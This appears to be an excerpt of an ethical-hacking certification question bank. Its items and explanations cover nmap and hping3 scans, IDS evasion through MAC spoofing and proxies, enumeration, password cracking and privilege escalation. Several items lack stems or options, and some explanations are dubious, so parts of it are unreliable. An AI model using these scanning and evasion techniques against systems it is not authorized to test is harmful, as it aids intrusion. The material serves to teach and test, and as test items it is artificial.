45. Jude, a security professional in an organization, was instructed to strengthen the security of the organization. In the process, to prevent direct attacks against an information system, Jude implemented a strategy based on the military principle that it is more difficult for an enemy to defeat a complex and multi-layered security system.
	What is the security strategy that Jude has implemented to prevent direct attacks against the information system?
+ [x] Defense-in-depth
+ [ ] Incident management
+ [ ] Threat modeling
+ [ ] Information assurance
> **Explanation:**
> + Threat Modeling: Threat modeling is a risk assessment approach for analyzing the security of an application by capturing, organizing, and analyzing all the information that affects it. The threat model consists of three major building blocks: understanding the adversary’s perspective, characterizing the security of the system, and determining threats.
> + Incident Management: Incident management is a set of defined processes to identify, analyze, prioritize, and resolve security incidents to restore the system to normal service operations as soon as possible, and prevent recurrence of the incident.
> + Information Assurance: IA refers to the assurance of the integrity, availability, confidentiality, and authenticity of information and information systems during the usage, processing, storage, and transmission of information. Security experts accomplish information assurance with the help of physical, technical, and administrative controls
> + **Defense-in-Depth:** Defense-in-depth is a security strategy in which security professionals use several protection layers throughout an information system. This strategy uses the military principle that it is more difficult for an enemy to defeat a complex and multi-layered defense system than to penetrate a single barrier. Defense-in-depth helps to prevent direct attacks against an information system and its data because a break in one layer only leads the attacker to the next layer

46. Which of the following tasks DOES NOT fall under the scope of ethical hacking?
+ [x] Defense-in-depth implementation
+ [ ] Risk assessment
+ [ ] Pen testing
+ [ ] Vulnerability scanning
> **Explanation:**
> + Ethical hacking is a structured and organized security assessment, usually as part of a penetration test or security audit. Ethical hackers determine the scope of the security assessment according to the client's security concerns. Many ethical hackers are members of a “tiger team.” A tiger team works together to perform a full-scale test covering all aspects of the network, as well as physical and system intrusion.
> + **Defense-in-depth implementation** is the job role of a network security engineer where several protection layers are placed throughout an information system to prevent direct attacks. If a hacker gains access to a system, defense in depth minimizes any adverse impact and gives network security administrators and engineers time to deploy new or updated countermeasures to prevent a recurrence of intrusion.

47. If the final set of security controls does not eliminate all the risk in a system, what could be done next?
+ [ ] Continue to apply controls until there is zero risk.
+ [ ] Ignore any remaining risk.
+ [x] If the residual risk is low enough, it can be accepted.
+ [ ] Remove current controls since they are not completely effective.
> **Explanation:**
> + Risk refers to a probability of the occurrence of a threat or an event that may damage, cause loss, or have other negative impact either from internal or external liabilities.
> + To reduce or eliminate the risk, organizations implement various information security controls to prevent unwanted events from occurring, but some risks will remain at a certain level, and this is what residual risks are.
> + If the securing controls fail in eliminating the complete risk, then reusing the same or removing them does not make any sense.
> + Once you find out what residual risks are, what do you do with them? Basically, you have these three options:
> 	1.  If the level of risks is below the acceptable level of risk, then you do nothing—the management needs to formally accept those risks.
> 	2.  If the level of risks is above the acceptable level of risk, then you need to find out some new (and better) ways to mitigate those risks
> 	3.  If the level of risks is above the acceptable level of risk, and the costs of decreasing such risks would be higher than the impact itself, then you need to propose to the management to accept these high risks.

+ [ ] `hping3 -S <Target IP> -p 80 --tcp-timestamp`
+ [x] `hping3 <Target IP> -Q -p 139 -s`
+ [ ] `hping3 –A <Target IP> –p 80`
> **Explanation:**
> + **`hping3 <Target IP> -Q -p 139 -s`:** By using the argument -Q in the command line, Hping collects all the TCP sequence numbers generated by the target host.
> + `hping3 –A <Target IP> –p 80`: By issuing this command, Hping checks if a host is alive on a network. If it finds a live host and an open port, it returns an RST response.
> + `hping3 -S <Target IP> -p 80 --tcp-timestamp`: By adding the --tcp-timestamp argument in the command line, Hping enable TCP timestamp option and try to guess the timestamp update frequency and uptime of the target host.
> + `hping3 –F –P –U 10.0.0.25 –p 80`: By issuing this command, an attacker can perform FIN, PUSH, and URG scans on port 80 on the target host.

119. If a tester is attempting to ping a target that exists but receives no response or a response that states the destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option could the tester use to get a response from a host using TCP?
+ [ ] Traceroute
+ [x] Hping
+ [ ] TCP ping
+ [ ] Broadcast ping
> **Explanation:**
> Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.
> 
> In the above scenario, host does not respond to a ping request. Here, tester need to use Hping tools and perform ACK scan to get the response from a host using TCP.
> 
> Hping can be configured to perform an ACK scan by specifying the argument -A in the command line. Here, you are setting ACK flag in the probe packets and performing the scan. You perform this scan when a host does not respond to a ping request. By issuing this command, Hping checks if a host is alive on a network. If it finds a live host and an open port, it returns an RST response.

+ [ ] Discover the services running
+ [ ] Discover the network’s live hosts
+ [x] Discover usernames and passwords
+ [ ] Discover the services running
> **Explanation:**
> The more the information at hand about a target organization, the greater the chances of knowing a network’s security loopholes and consequently, for gaining unauthorized access to it. Below are some objectives for scanning a network:
> + Discover the network’s live hosts, IP addresses, and open ports of live. Using open ports, the attacker will determine the best means of entry into the system.
> + Discover the operating system and system architecture of the target. This is also known as fingerprinting. An attacker can formulate an attack strategy based on the operating system’s vulnerabilities.
> + Discover the services running/listening on the target system. Doing so gives the attacker an indication of vulnerabilities (based on the service) exploitation for gaining access to the target system.
> + Identify specific applications or versions of a particular service.
> + Identify vulnerabilities in any of the network systems. This helps an attacker to compromise the target system or network through various exploits.


## Host, Port and Service Discovery
123. Which of the following ping methods is effective in identifying active hosts similar to the ICMP timestamp ping, specifically when the administrator blocks the conventional ICMP ECHO ping?
+ [ ] ICMP ECHO ping sweep
+ [x] ICMP address mask ping scan
+ [ ] UDP ping scan
+ [ ] ICMP ECHO ping scan
> **Explanation:**
> + **ICMP Address Mask Ping Scan**: This type of ping method is also effective in identifying the active hosts similarly to the ICMP timestamp ping, specifically when the administrator blocks the traditional ICMP Echo ping
> + ICMP ECHO Ping Scan: ICMP ECHO ping scan involves sending ICMP ECHO requests to a host. If the host is alive, it will return an ICMP ECHO reply. This scan is useful for locating active devices or determining if ICMP is passing through a firewall.
> + ICMP ECHO Ping Sweep: A ping sweep (also known as an ICMP sweep) is a basic network scanning technique that is adopted to determine the range of IP addresses that map to live hosts (computers). Although a single ping will tell the user whether a specified host computer exists on the network, a ping sweep consists of ICMP ECHO requests sent to multiple hosts. If a specified host is active, it will return an ICMP ECHO reply.
> + UDP Ping scan: UDP ping scan is similar to TCP ping scan; however, in the UDP ping scan, Nmap sends UDP packets to the target host.

124. Which of the following protocols uses the port number 88/TCP and can verify the identity of a user or host connected to a network?
+ [ ] Finger
+ [ ] TFTP
+ [ ] NTP
+ [x] Kerberos

> The important reserved ports are listed below:
> 
> | Name     | Port/Protocol | Service Description   |
> |----------|---------------|-----------------------|
> | tftp     | 69/tcp        | Trivial File Transfer |
> | finger   | 79/tcp        | Finger                |
> | kerberos | 88/tcp        | Kerberos              |
> | ntp      | 123/tcp       | Network Time Protocol |

125. Which of the following scans detects when a port is open after completing the three-way handshake, establishes a full connection, and closes the connection by sending an RST packet?
+ [ ] IDLE/IPID header scan
+ [ ] ACK flag probe scan
+ [ ] Stealth scan
+ [x] TCP connect scan
> **Explanation:**
> + **TCP Connect scan** detects when a port is open after completing the three-way handshake. TCP Connect scan establishes a full connection and then closes the connection by sending an RST packet
> + Stealth Scan involves abruptly resetting the TCP connection between the client and server before the completion of three-way handshake signals, thus leaving the connection half-open. scanning involves abruptly resetting the TCP connection between the client and server before the completion of three-way handshake signals, thus leaving the connection half-open
> + ACK Flag Probe Scan is used by the attackers send TCP probe packets set with an ACK flag to a remote device and then analyze the header information (TTL and WINDOW field) of received RST packets to determine if the port is open or closed
> + In IDLE/IPID Header Scan, every IP packet on the Internet has a fragment identification number (IPID); an OS increases the IPID for each packet sent; thus, probing an IPID gives an attacker the number of packets sent after the last probe. A machine that receives an unsolicited SYN|ACK packet will respond with an RST. An unsolicited RST will be ignored

126. Which of the following Nmap options is used by an attacker to perform an SCTP COOKIE ECHO scan?
+ [ ] -sY
+ [ ] -sL
+ [ ] -sU
+ [x] -sZ
> **Explanation:**
> + In Zenmap, the -sY option is used to perform the SCTP INIT scan.
> + In Zenmap, the -sU option is used to perform a UDP scan.
> + **In Zenmap, the -sZ option is used to perform the SCTP COOKIE ECHO scan**.
> + In Zenmap, the -sL option is used to perform a list scan.

127. In which of the following scanning techniques does an attacker send a spoofed source address to a computer to determine the available services?
+ [ ] Inverse TCP flag scan
+ [ ] TCP Maimon scan
+ [ ] ACK flag probe scan
+ [x] IDLE/IPID header scan
> **Explanation:**
> + Inverse TCP Flag Scan: Attackers send TCP probe packets with a TCP flag (FIN, URG, PSH) set or with no flags. When the port is open, the attacker does not get any response from the host, whereas when the port is closed, he or she receives the RST from the target host.
> + ACK Flag Probe Scan: Attackers send TCP probe packets with the ACK flag set to a remote device and then analyze the header information (TTL and WINDOW field) of the received RST packets to find out if the port is open or closed. The ACK flag probe scan exploits the vulnerabilities within the BSD-derived TCP/IP stack. Thus, such scanning is effective only on those OSs and platforms on which the BSD derives TCP/IP stacks.
> + TCP Maimon scan: This scan technique is very similar to NULL, FIN, and Xmas scan, but the probe used here is FIN/ACK. In most cases, to determine if the port is open or closed, the RST packet should be generated as a response to a probe request. However, in many BSD systems, the port is open if the packet gets dropped in response to a probe
> + **IDLE/IPID Header Scan**: The IDLE/IPID Header scan is a TCP port scan method that you can use to send a spoofed source address to a computer to find out what services are available. It offers complete blind scanning of a remote host. Most network servers listen on TCP ports, such as web servers on port 80 and mail servers on port 25. A port is considered “open” if an application is listening on the port

128. While performing a UDP scan of a subnet, you receive an ICMP reply of Code 3/Type 3 for all the pings you have sent out. What is the most likely cause of this?
+ [x] UDP port is closed.
+ [ ] UDP port is open.
+ [ ] The firewall is dropping the packets.
+ [ ] The host does not respond to ICMP packets.
> **Explanation:**
> In a UDP scan, user sends UDP packets to a target port and waits for the response.
> 
> When a user sends a UDP packet to the target, either of the following can occur:
> + If the UDP port is open, the target accepts the packet and does not send any response.
> + If the UDP port is closed, the ICMP packet is sent in response.
> 
> The user will receive an ICMP Type 3 Code 3 response if the port is closed, or if no response is received, then the port is either open | filtered.

129. A security engineer is attempting to perform scanning on a company’s internal network to verify security policies of their networks. The engineer uses the following NMAP command: `nmap –n –sS –P0 –p 80 ***.***.**.**`. What type of scan is this?
+ [ ] Quick scan
+ [ ] Comprehensive scan
+ [x] Stealth scan
+ [ ] Intense scan
> **Explanation:**
> Nmap scanning techniques:
> + o -sS (TCP SYN/Stealth scan)
> + o -sT (TCP connect scan)
> + o -sU (UDP scans)
> + o -sY (SCTP INIT scan)
> + o -sN; -sF; -sX (TCP NULL, FIN, and Xmas scans)
> + o -sA (TCP ACK scan)
> + o -sW (TCP Window scan)
> 
> In the above scenario, the security engineer uses -sS option to perform the scan. This means he is performing stealth scan.

130. A penetration tester is conducting a port scan on a specific host. The tester found several open ports that were confusing in concluding the operating system (OS) version installed. Considering the NMAP result below, which of the following is likely to be installed on the target machine by the OS?
```
Starting NMAP 7.70 at 2018-03-15 11:06
NMAP scan report for 172.16.40.65
Host is up (1.00s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
139/tcp  open  netbios-ssn
515/tcp  open
631/tcp  open  ipp
9100/tcp open
MAC Address: 00:00:48:0D:EE:89
```
+ [ ] The host is likely a router.
+ [x] The host is likely a printer.
+ [ ] The host is likely a Linux machine.
+ [ ] The host is likely a Windows machine.
> **Explanation:**
> The protocols TCP and UDP uses port 515 to interact with the printer. As port 515 is open in the above Nmap output, probably the host is a printer.

131. Which NMAP command combination would let a tester scan every TCP port from a class C network that is blocking ICMP with fingerprinting and service detection?
+ [ ] NMAP -P0 -A -sT -p0-65535 192.168.0/16
+ [ ] NMAP -PN -O -sS -p 1-1024 192.168.0/8
+ [x] NMAP -PN -A -O -sS 192.168.2.0/24
+ [ ] NMAP -P0 -A -O -p1-65535 192.168.0/24
> **Explanation:**
> + -Pn (also known as No ping) Assume the host is up, thus skipping the host discovery phase, whereas P0 (IP Protocol Ping) sends IP packets with the specified protocol number set in their IP header.
> + -A This options makes Nmap make an effort in identifying the target OS, services, and the versions. It also does traceroute and applies NSE scripts to detect additional information.
> + The -O option turns on Nmap’s OS fingerprinting system. Used alongside the -v verbosity options, you can gain information about the remote operating system and about its TCP sequence number generation (useful for planning idle scans).
> + -sS Perform a TCP SYN connect scan. This just means that Nmap will send a TCP SYN packet just like
> + any normal application would do. If the port is open, the application must reply with SYN/ACK; however, to prevent half-open connections Nmap will send an RST to tear down the connection again.
> + -sT is an Nmap TCP connect scan and it is the default TCP scan type when SYN scan is not an option.
> + Since, Class C network starts its IP address from 192.0.0.0.
> + So, “NMAP -PN -A -O -sS 192.168.2.0/24” is the correct answer.

132. Which protocol and port number might be needed to send log messages to a log analysis tool that resides behind a firewall?
+ [ ] UDP 123
+ [ ] UDP 541
+ [ ] UDP 415
+ [x] UDP 514
> **Explanation:**
> + The syslog protocol enables network devices to record event messages to the logging server or the syslog server. It is possible to log many events and the syslog protocol can handle many different devices. Normally, Windows-based servers do not support syslog. However, there are many third-party tools available that can actually gather the Windows server log information and then forward it to the syslog server.
> + Syslog is the standard for message logging and uses a facility code that determines the software used for generating the messages and also assigns a severity label to each. The syslog finds its application in system management, security auditing, and debugging messages. Many types of devices such as printers, routers, and so on use the syslog standard that enables a centralized method of logging data from different devices. The syslog server gathers information sent over the network over UDP port 514 using a syslog listener.


## OS Discovery and Scanning Beyond IDS/Firewall
133. Which of the following OS discovery techniques is used by an attacker to identify a target machine’s OS by observing the TTL values in the acquired scan result?
+ [ ] OS discovery using IPv6 fingerprinting
+ [ ] OS discovery using Nmap Script Engine
+ [ ] OS discovery using Nmap
+ [x] OS discovery using Unicornscan
> **Explanation:**
> + OS Discovery using Nmap: Nmap is one of the effective tools for performing OS discovery activities. In Zenmap, the -O option is used to perform OS discovery, which displays the OS details of the target machine.
> + **OS Discovery using Unicornscan**: In unicornscan, the OS of the target machine can be identified by observing the TTL values in the acquired scan result. To perform Unicornscan, the syntax #`unicornscan <target IP address>` is used.
> + OS Discovery using Nmap Scripting Engine: NSE in Nmap can be used to automate a wide variety of networking tasks by allowing users to write and share scripts. These scripts can be executed parallelly with the same efficiency and speed as Nmap. Attackers can also use various scripts in the Nmap Script Engine for performing OS discovery on the target machine.
> + OS Discovery using IPv6 Fingerprinting: It is another technique used to identify the OS running on the target machine. It has the same functionality as IPv4, such as sending probes, waiting and collecting the responses, and matching them with the database of fingerprints.

134. What type of OS fingerprinting technique sends specially crafted packets to the remote OS and analyzes the received response?
+ [ ] Passive
+ [x] Active
+ [ ] Reflective
+ [ ] Distributive
> **Explanation:**
> + In active OS fingerprinting, specially crafted packets are sent to remote OS and the responses are noted. The responses are then compared with a database to determine the OS. Response from different OSes varies due to differences in TCP/IP stack implementation.

135. Which of the following IDS/firewall evasion techniques is used by an attacker to bypass Internet censors and evade certain IDS and firewall rules?
+ [ ] Sending bad checksums

> + Source Routing: The attacker specifies the routing path for the malformed packet to reach the intended target.
> + Source Port Manipulation: The attacker manipulates the actual source port with the common source port to evade the IDS/firewall
> + **Proxy Chaining**: Proxy chaining helps an attacker to increase his/her Internet anonymity. Internet anonymity depends on the number of proxies used for fetching the target application; the larger the number of proxy servers used, the greater is the attacker’s anonymity.

137. Which of the following commands allows attackers to auto-generate a random MAC address and attach it to the packets in place of the original MAC address while performing host scanning?
+ [ ] `nmap -sT -Pn –spoof-mac [new MAC] [Target IP]`
+ [ ] `nmap -sU -v [Target IP]`
+ [x] `nmap -sT -Pn –spoof-mac 0 [Target IP]`
+ [ ] `Cewl www.certifiedhacker.com`
> **Explanation:**
> + **nmap -sU -v [Target IP]**: In Zenmap, the -sU option is used to perform a UDP scan.
> + **nmap -sT -Pn –spoof-mac 0 [Target IP]:** This command automatically generates a random MAC address and attaches it to the packets in place of the original MAC address while performing host scanning. Here, **--spoof-mac 0** represents the randomization of the MAC address.
> + **cewl www.certifiedhacker.com:** Attackers uses this command to gather a list of unique words present in the target URL.
> + **nmap -sT -Pn –spoof-mac [new MAC] [Target IP]:** This command allows attackers to manually choose or set a new MAC address for the packets sent during the scanning process. **--spoof-mac [new MAC]** represents manually setting the MAC address.

+ [ ] Source routing
+ [ ] Port scanning
> **Explanation:**
> + Port scanning: Port scanning is the process of checking the services running on the target computer by sending a sequence of messages in an attempt to break in.
> + **Banner grabbing:** Banner grabbing or OS fingerprinting is the method used to determine the operating system running on a remote target system. Identifying the OS used on the target host allows an attacker to figure out the vulnerabilities the system posses and the exploits that might work on a system to further carry out additional attacks.
> + Source Routing: Source routing refers to sending a packet to the intended destination with partially or completely specified route (without firewall-/IDS-configured routers) in order to evade IDS/firewall.
> + IP address decoy: IP address decoy technique refers to generating or manually specifying IP addresses of the decoys in order to evade IDS/firewall.

139. Which NMAP feature can a tester implement or adjust while scanning for open ports to avoid detection by the network’s IDS?

## Network Scanning Countermeasures
141. Which of the following countermeasure helps organizations to prevent information disclosure through banner grabbing?
+ [ ] Disable open relay feature
+ [x] Display false banners
+ [ ] Disable the DNS zone transfers to the untrusted hosts
+ [ ] Restrict anonymous access through RestrictNullSessAccess parameter from the Windows registry
> **Explanation:**
> When attackers connect to the open port using banner grabbing techniques, the system presents a banner containing sensitive information such as OS, server type, and version. With the help of the information gathered, the attacker identifies specific vulnerabilities to exploit and thereafter launches attacks.
> 
> The countermeasures to defend against banner grabbing attacks are as follows:
> + Display false banners to mislead or deceive attackers.
> + Turn off unnecessary services on the network host to limit information disclosure.
> + Disabling open relay feature protect from SMTP enumeration
> + Disabling the DNS zone transfers to the untrusted hosts protect from DNS enumeration
> + Restricting anonymous access through RestrictNullSessAccess parameter from the Windows Registry protect from SMB enumeration

142. Which of the following types of techniques is used to prevent IP spoofing by blocking outgoing packets with a source address that is not inside?
+ [x] Egress filtering
+ [ ] Access-control lists
+ [ ] Random initial sequence numbers
+ [ ] Ingress filtering
> **Explanation:**
> + **Egress filtering** refers to a practice that aims to prevent IP spoofing by blocking outgoing packets with a source address that is not inside.
> + Random initial sequence numbers: Most devices choose their ISN based on timed counters. This makes the ISNs predictable, as it is easy for an attacker to determine the concept of generating the ISN. The attacker can determine the ISN of the next TCP connection by analyzing the ISN of the current session or connection. If the attacker can predict the ISN, then he/she can establish a malicious connection to the server and sniff out your network traffic. To avoid this risk, use random initial sequence numbers.
> + Ingress filtering prevents spoofed traffic from entering the Internet. It is applied to routers because it enhances the functionality of the routers and blocks spoofed traffic. Configuring and using ACLs that drop packets with the source address outside the defined range is one method of implementing ingress filtering.
> + Access control lists (ACLs) blocks unauthorized access by specifying which users or system processes are granted access to objects, as well as what operations are allowed on given objects.

143. Which of the following tools provides complete visibility, real-time detection, and intelligent response to malicious network scanning attempts?
+ [x] ExtraHop
+ [ ] CyberGhost VPN
+ [ ] Orbot
+ [ ] WinHex
> **Explanation:**
> + Orbot: Orbot is a proxy app that allows other apps to use the Internet more securely. It uses Tor to encrypt Internet traffic and then hides it by bouncing through a series of computers around the world.
> + CyberGhost VPN: CyberGhost VPN hides the attacker's IP and replaces it with a selected IP, allowing him or her to surf anonymously and access blocked or censored content.
> + **ExtraHop:** ExtraHop provides complete visibility, real-time detection, and intelligent response to malicious network scanning. This tool allows security professionals to automatically discover and identify every device and its vulnerabilities, including unmanaged Internet of things (IoT) devices in a network.
> + WinHex: WinHex is a hexadecimal editor, used for computer forensics, data recovery, low-level data processing, and IT security.

144. Which of the following practices helps security professionals defend a network or service against port scanning attempts?
+ [ ] Never use port scanning tools against hosts on the network.
+ [x] Ensure that TCP wrappers limit access to the network based on domain names or IP addresses.
+ [ ] Never use a custom rule set to lock down the network and block unwanted ports at the firewall.
+ [ ] Never configure firewall and intrusion detection system (IDS) rules to block probes.
> **Explanation:**
> Port Scanning Countermeasures:
> + Configure firewall and intrusion detection system (IDS) rules to detect and block probes.
> + Run the port scanning tools against hosts on the network to determine whether the firewall accurately detects the port scanning activity.
> + Ensure that the router, IDS, and firewall firmware are updated with their latest releases/versions.
> + **Ensure that TCP wrappers limit access to the network based on domain names or IP addresses.**
> + Keep as few ports open as possible and filter the rest, as an intruder may attempt to enter through any open port. Use a custom rule set to lock down the network, block unwanted ports at the firewall, and filter the following ports: 135–159, 256–258, 389, 445, 1080, 1745, and 3268.

145. Which of the following practices can make the target device or system vulnerable to banner grabbing attacks?
+ [x] Enable HTTP methods such as Connect, Put, Delete, and Options from web application servers.

# 04. Enumeration
## Enumeration Concepts
150. In which of the following enumeration techniques does an attacker take advantage of different error messages generated during the service authentication process?
+ [x] Brute-force Active Directory
+ [ ] Extracting usernames using email IDs
+ [ ] Extracting information using default passwords
+ [ ] Extracting usernames using SNMP
> **Explanation:**
> + Extract usernames using SNMP: Attackers can easily guess read-only or read-write community strings by using the SNMP application programming interface (API) to extract usernames.
> + Extract usernames using email IDs: Every email address contains two parts, a username, and a domain name, in the format username@domainname. The attacker can take advantage of the first part.
> + **Brute force Active Directory:** This is a design error in the Microsoft Active Directory implementation. If a user enables the “logon hours” feature, then all the attempts at service authentication result in different error messages.
> + Extract information using default passwords: Users often ignore recommendations to change the default usernames and passwords provided by the manufacturer or developer of a product. Attackers can also use the company’s default passwords to launch attacks on the target network or device.

154. Jake, an attacker, is performing an attack on a target organization to gather sensitive information. In this process, he exploited the protocol running on port 23 to perform banner grabbing on other protocols, such as SSH and SMTP, as well as brute-forcing attacks on login credentials.
	Which of the following protocols is running on port 23?
+ [x] Telnet
+ [ ] Border Gateway Protocol
+ [ ] Secure Shell
+ [ ] File Transfer Protocol
> **Explanation:**
> + Secure Shell: Secure Shell (SSH) is a command-level protocol mainly used for managing various networked devices securely. It is generally used as an alternative protocol to the unsecure Telnet protocol. SSH uses the client/server communication model, and the SSH server, by default, listens to its client on TCP port 22
> + File Transfer Protocol: FTP is a connection-oriented protocol used for transferring files over the Internet and private networks. FTP is controlled on TCP port 21, and for data transmission, FTP uses TCP port 20 or some dynamic port numbers depending on the server configuration
> + **Telnet:** The Telnet protocol is used for managing various networked devices remotely. It is an unsecure protocol because it transmits login credentials in the cleartext format. Therefore, it is mostly used in private networks. The Telnet server listens to its clients on port 23. Attackers can take advantage of the Telnet protocol to perform banner grabbing on other protocols such as SSH and SMTP, brute-forcing attacks on login credentials, port-forwarding attacks, etc.

156. Which of the following port number is used to exploit vulnerabilities within DNS servers to launch attacks?
+ [ ] UDP 137
+ [ ] TCP 139
+ [x] TCP/UDP 53
+ [ ] TCP/UDP 135
> **Explanation:**
> The DNS resolution process establishes communication between DNS clients and DNS servers. DNS clients send DNS messages to DNS servers listening on UDP port 53. In case, the DNS message size exceeds the default size of UDP (512 octets), the response contains only data that UDP can accommodate, and the DNS server sets a flag to indicate the truncated response. The DNS client can now resend the request via TCP over port 53 to the DNS server. In this approach, the DNS server uses UDP as a default protocol, and in case of lengthy queries where UDP fails, it uses TCP as a backup failover solution. Some malwares such as ADM worm and Bonk Trojan use port 53 to exploit vulnerabilities within DNS servers. This can help intruders to launch attacks.

209. Which of the following protocols is the technology for both gateway-to-gateway (LAN-to-LAN) and host to gateway (remote access) enterprise VPN solutions?
+ [ ] NetBios
+ [ ] SMTP
+ [x] IPSec
+ [ ] SNMP
> **Explanation:**
> IPsec is the most commonly implemented technology for both gateway-to-gateway (LAN-to-LAN) and host-to-gateway (remote access) enterprise VPN solutions. IPsec provides data security by employing various components such as ESP (encapsulation security payload), AH (authentication header), and IKE (Internet key exchange) to secure communication between VPN end-points. Most Ipsec-based VPNs use ISAKMP (Internet security association key management protocol), a part of IKE, to establish, negotiate, modify, and delete security associations (SA) and cryptographic keys in a VPN environment. An attacker can perform simple direct scanning for ISAKMP at UDP port 500 with tools, such as Nmap, to acquire the information related to the presence of a VPN gateway.

> + Remediation
> + Verification
> + Monitoring

227. Which of the following terms refers to the existence of a weakness, design flaw, or implementation error that can lead to an unexpected event compromising the security of the system?
+ [x] Vulnerability
+ [ ] Zero-day attack
+ [ ] Hacking
+ [ ] Exploit
> **Explanation:**
> Exploit refers to a breach in a system. Attackers take advantage of a vulnerability or weakness in the system to exploit it. Hacking refers to exploiting system vulnerabilities and compromising security controls to gain unauthorized or inappropriate access to the system resources. A zero-day attack is an attack that exploits computer application vulnerabilities before the software developer releases a patch for the vulnerability.

228. Which of the following terms refers to the process of reducing the severity of vulnerabilities in the vulnerability management life cycle?
+ [ ] Risk assessment
+ [x] Remediation
+ [ ] Vulnerability assessment
+ [ ] Verification
> **Explanation:**
> Vulnerability management life cycle is an important process that helps in finding and remediating security weaknesses before they are exploited. This includes defining the risk posture and policies for an organization, creating a complete asset list of systems, scanning and assessing the environment for vulnerabilities and exposures, and taking action to mitigate the vulnerabilities that are found.
> 
> The phases involved in vulnerability management are:
> + **Creating Baseline**
> In this phase, critical assets are identified and prioritized to create a good baseline for the vulnerability management.
> 
> + **Vulnerability Assessment**
> This is a very crucial phase in vulnerability management. In this step, the security analyst identifies the known vulnerabilities in the organization infrastructure.
> 
> + **Risk Assessment**
> In this phase, all the serious uncertainties that are associated with the system are assessed, fixed, and permanently eliminated for ensuring a flaw free system.
> 
> + **Remediation**
> Remediation is the process of reducing the severity of vulnerabilities. This phase is initiated after the successful implementation of the baseline and assessment steps.
> 
> + **Verification**
> This phase provides a clear visibility into the firm and allows the security team to check whether all the previous phases are perfectly employed or not.
> 
> + **Monitor**
> Regular monitoring needs to be performed for maintaining the system security using tools such as IDS/IPS, firewalls, etc.

+ [ ] Brute-force attack
+ [x] Dictionary attack
> **Explanation:**
> + Man-in-the-Middle Attack: When two parties are communicating, a man-in-middle attack can take place, in which a third party intercepts a communication between the two parties without their knowledge. Meanwhile, the third party eavesdrops on the traffic, and then passes it along. To do so, the “man in the middle” has to sniff from both sides of the connection simultaneously. In a MITM attack, the attacker acquires access to the communication channels between victim and server to extract the information.
> + Brute Force Attack: In the brute force method, all possible characters are tested, for example, uppercase from A to Z, numbers from 0 to 9, and lowercase from a to z. This method is useful to identify one-word or two-word passwords. If a password consists of uppercase and lowercase letters and special characters, it might take months or years to crack the password using a brute force attack.
> + **Dictionary Attack:** A dictionary attack has predefined file that contains a list of words of various combinations, and an automated program tries entering these words one at a time to see if any of them are the password. This might not be effective if the password includes special characters and symbols. If the password is a simple word, then it can be found quickly.
> + Session Hijacking: Session hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers. Since most authentication only occurs at the start of a TCP session, it allows the attacker to gain access to a machine. Attackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud, etc.

296. You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least eight characters in length. All passwords must also use three of the four following categories: lower-case letters, capital letters, numbers, and special characters. With your given knowledge of users, likely user account names, and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values to get results?
+ [ ] Replay attack
+ [ ] Dictionary attack
+ [x] Hybrid attack
+ [ ] Brute-Force attack
> **Explanation:**
> + Replay Attack: In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access. The attacker uses this type of attack to replay bank transactions or other similar types of data transfer, in the hope of replicating and/or altering activities, such as banking deposits or transfers.
> + Dictionary Attack: In a dictionary attack, a dictionary file is loaded into the cracking application that runs against user accounts. This dictionary is the text file that contains a number of dictionary words that are commonly used as passwords. The program uses every word present in the dictionary to find the password. Apart from a standard dictionary, attackers’ dictionaries have added entries with numbers and symbols added to words (e.g., “3December!962”). Simple keyboard finger rolls (“qwer0987”), which many believe to produce random and secure passwords, are thus included in an attacker's dictionary.
> + Brute-Force Attack: In a brute force attack, attackers try every combination of characters until the password is broken. Cryptographic algorithms must be sufficiently hardened to prevent a brute-force attack, which is defined by the RSA: “Exhaustive key-search, or brute-force search, is the basic technique for trying every possible key in turn until the correct key is identified.”
> + **Hybrid Attack:** A hybrid attack is more powerful as it uses both a dictionary attack and brute force attack. It also uses symbols and numbers. Password cracking becomes easier with this method. Often, people change their passwords merely by adding some numbers to their old passwords. In this case, the program would add some numbers and symbols to the words from the dictionary to try and crack the password. For example, if the old password is “system,” then there is a chance that the person will change it to “system1” or “system2.”

> + **hashcat:** Attackers use the hashcat tool to perform password attacks such as brute-force attacks, dictionary attacks, and mask attacks. To perform mask attacks, an attacker must know the flags used for the built-in charset, custom charset, and attack mode to create an appropriate pattern for the password.
> + Dylib Hijack Scanner: Dylib Hijack Scanner (DHS) is a simple utility that will scan your computer for applications that are either susceptible to dylib hijacking or have been hijacked.

+ [ ] Logon script (Windows)
+ [ ] RC scripts
+ [x] Network logon scripts
+ [ ] Startup items
> **Explanation:**
> + Logon Script (Windows): Once a user or a user group is signed into a Windows system, the OS allows the execution of logon scripts. These scripts are used by attackers to create persistence and escalate privileges on a system by embedding the path to their script.
> + RC scripts: Attackers abuse RC scripts to escalate privileges and create persistence during the startup process of Unix-based systems. These scripts are executed during system startup and allow the mapping and initializing of custom startup services. These custom services can be used by an attacker for various run levels.
> + **Network Logon Scripts:** Attackers leverage network logon scripts for escalating privileges and maintaining persistence. These scripts are allocated using AD or GPOs. Such logon scripts are executed using any valid user’s credentials. The initialization of a network logon script can be utilized for different systems based on the networked systems. For this reason, attackers abuse network logon scripts to gain local or administrator credentials based on the access configuration to escalate their privileges.
> + Startup Items: In macOS systems, startup items run at the last stage of the booting process and include different executable files or shell scripts along with their configuration information, which is used to determine the order of execution for the startup items.

324. Cooper, a professional hacker, managed to gain unauthorized access to a target system. To escalate privileges and maintain persistence, he created a new process via the CreateProcess API by abusing system processes such as svchost.exe. Consequently, Cooper bypassed security mechanisms that restrict process spawning from a root process and escalated privileges.
	Which of the following techniques did Cooper implement to escalate privileges in the above scenario?
+ [ ] Abusing SUID and SGID permissions
+ [ ] SID-History injection
+ [ ] Access token manipulation
+ [x] Parent PID spoofing
> **Explanation:**
